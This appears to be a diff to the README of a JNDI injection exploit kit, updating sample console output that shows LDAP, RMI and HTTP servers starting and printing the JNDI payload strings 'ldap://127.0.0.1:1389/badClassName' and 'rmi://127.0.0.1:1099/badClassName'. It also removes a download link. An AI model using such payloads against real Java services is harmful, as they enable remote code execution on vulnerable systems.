@@ -23,18 +23,16 @@
 |\  \\_\  \ \  \\ \  \ \  \_\\ \ \  \ \  \\ \  \ \  \   \ \  \ 
 \ \________\ \__\\ \__\ \_______\ \__\ \__\\ \__\ \__\   \ \__\
  \|________|\|__| \|__|\|_______|\|__|\|__| \|__|\|__|    \|__|
-11:32:56 [INFO] [org.sec.Main] start jndi kit
-11:32:56 [INFO] [org.sec.Main] cmd: notepad.exe
-11:32:56 [INFO] [org.sec.Http] start http server: 0.0.0.0:8000
-11:32:56 [INFO] [org.sec.Ldap] start ldap server: 0.0.0.0:1389
+19:13:27 [INFO] [org.sec.ServerMain] start jndi kit
+19:13:27 [INFO] [org.sec.ServerMain] cmd: calc.exe
+19:13:27 [INFO] [org.sec.Http] start http server: 0.0.0.0:8000
+19:13:27 [INFO] [org.sec.RMI] start rmi registry 0.0.0.0:1099
+19:13:27 [INFO] [org.sec.Ldap] start ldap server: 0.0.0.0:1389
 |--------------------------------------------------------|
 |------Payload: ldap://127.0.0.1:1389/badClassName-------|
+|------Payload: rmi://127.0.0.1:1099/badClassName-------|
 |--------------------------------------------------------|
 ```
-
-然后......
-
-[下载地址](https://github.com/EmYiQing/LDAPKit/releases/download/1.0/LDAPKit.jar)
 
 ## 免责申明
 
